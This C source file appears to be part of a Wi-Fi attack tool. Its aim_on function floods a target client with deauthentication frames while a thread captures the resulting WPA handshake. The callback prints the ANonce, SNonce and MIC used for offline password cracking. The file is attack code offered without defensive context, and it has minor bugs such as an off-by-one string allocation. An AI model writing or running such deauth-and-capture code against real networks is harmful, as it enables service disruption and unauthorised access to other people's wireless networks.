#include "target.h"
//#include "../colors/colors.h"
#include "../menu/menu.h"

struct params {
    char* iface;
    int freq;
    byte client[6];
    byte bssid[6];
    struct response_chunk_ll* chunk;
    char* ended;
};


void print_bytes(uint8_t* nonce, char* split,int length) {
    for(int i=0; i < length; ++i) {
        if(nonce[i] <= 15) {
            printf("0%2x",nonce[i]);
        }else {
            printf("%2x",nonce[i]);
        }
        if(i != length - 1)
            printf("%s",split);
    }
}




void handshake_callback(struct response_chunk_ll* chunk) {
    clear_screen();
    title();
    printf("\n\n\n");
    GREEN();

    printf("ap mac: ");
    print_bytes(chunk->amac,":",6);
    printf("\n");

    printf("station mac: ");
    print_bytes(chunk->smac,":",6);
    printf("\n");

    printf("anonce: ");
    print_bytes(chunk->anonce," ",32);
    printf("\n");

    printf("snonce: ");
    print_bytes(chunk->snonce," ",32);
    printf("\n");

    printf("mic: "); 
    print_bytes(chunk->mic," ",16);
    printf("\n"); 

    free(chunk);
}

void* start(void* arg) {
    struct params* p = (struct params*)arg;
    sniff_handshake(p->iface,p->bssid,p->client,handshake_callback, p->ended);
    free(p);
}


void aim_on(char* iface, int freq, byte client[6], byte bssid[6], struct response_chunk_ll* chunk, char* ended) {
    struct params* p = (struct params*)malloc(sizeof(struct params));
    memcpy(p->client,client,6);
    memcpy(p->bssid,bssid,6);
    p->iface = malloc(strlen(iface));
    strcpy(p->iface,iface);
    p->freq = freq;
    // struct response_chunk_ll* chunk = (struct response_chunk_ll*)malloc(sizeof(struct response_chunk_ll));
    // memset(chunk,0,sizeof(chunk));
    p->chunk = chunk;
    p->ended = ended;

    pthread_t thread;
    if(pthread_create(&thread,NULL,start,p) != 0) {
        printf("Thread error\n");
    }
    struct packet* deauth_pack = create_deauth_frame(bssid,client);
    send_packet_multiple(iface,freq,deauth_pack,100,5,15,1,(byte*)ended);
    free(deauth_pack->data);
    free(deauth_pack);
}